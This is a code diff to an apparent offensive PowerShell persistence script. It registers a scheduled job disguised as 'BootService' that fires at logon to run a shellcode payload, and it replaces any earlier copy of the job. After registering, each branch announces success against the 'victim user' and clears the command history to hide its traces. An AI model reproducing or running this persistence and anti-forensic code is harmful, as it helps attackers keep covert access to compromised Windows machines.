@@ -101,9 +101,18 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
       # $Trig = New-JobTrigger -Once -At (Get-Date).AddMinutes(30) -RepeatIndefinitely -RepetitionInterval "00:30:00"
        $Trig = New-JobTrigger -Once -AtLogOn
        $scriptblock = [scriptblock]::Create($script)
-       Register-ScheduledJob -Name BootService -ScriptBlock $scriptblock -Trigger $Trig -ScheduledJobOption $Option
-       "Process Complete. Persistent schtask is created and will be triggered once the victim user logs on the computer."
-       Clear-History
+       $checkregisteredschedule = Get-ScheduledJob -Name BootService
+       if ($checkregisteredschedule){
+          Unregister-ScheduledJob BootService
+          Register-ScheduledJob -Name BootService -ScriptBlock $scriptblock -Trigger $Trig -ScheduledJobOption $Option
+          "Process Complete. Persistent schtask is created and will be triggered once the victim user logs on the computer."
+          Clear-History
+       }
+       else {
+          Register-ScheduledJob -Name BootService -ScriptBlock $scriptblock -Trigger $Trig -ScheduledJobOption $Option
+          "Process Complete. Persistent schtask is created and will be triggered once the victim user logs on the computer."
+          Clear-History
+       }
     }
 
 }
